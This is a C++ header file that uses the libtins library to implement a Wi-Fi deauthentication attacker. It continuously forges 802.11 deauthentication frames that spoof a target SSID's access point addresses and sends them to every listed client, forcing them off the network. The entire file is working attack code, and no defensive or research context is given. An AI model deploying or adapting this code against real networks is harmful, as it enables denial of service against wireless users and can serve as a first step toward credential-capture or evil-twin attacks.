#ifndef __DEAUTH_SENDER__
#define __DEAUTH_SENDER__

#include <iostream>
#include <set>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

class DeauthSender {
private:
    string iface_name;
    string targetSSID;
    set<HWAddress<6>> *address_set;
    set<HWAddress<6>> *target_set;
    bool endflag = false;
public:
    DeauthSender(map<string, set<HWAddress<6>>> *target_set, set<HWAddress<6>> *set, const string &iface, const string &targetSSID) {
        this->address_set = set;
        this->iface_name = iface;
        this->targetSSID = targetSSID;
        this->target_set = &(*target_set)[this->targetSSID];
    }

    void sendPacket() {
        while (!this->endflag) {
            for (auto target : *this->target_set) {
                if (this->address_set == nullptr) return;
                Dot11Deauthentication deauth;
                RadioTap radio = RadioTap();
                deauth.addr2(target);
                deauth.addr3(target);

                PacketSender sender(this->iface_name, 100);

                for (auto iter : *this->address_set) {
                    cout << "send: " << iter << endl;
                    deauth.addr1(iter);
                    RadioTap pkt = radio / deauth;
                    sender.send(pkt);
                }
            }
        }
    }

    bool isEnd() {
        return this->endflag;
    }

    void end() {
        this->endflag = true;
    }
};

#endif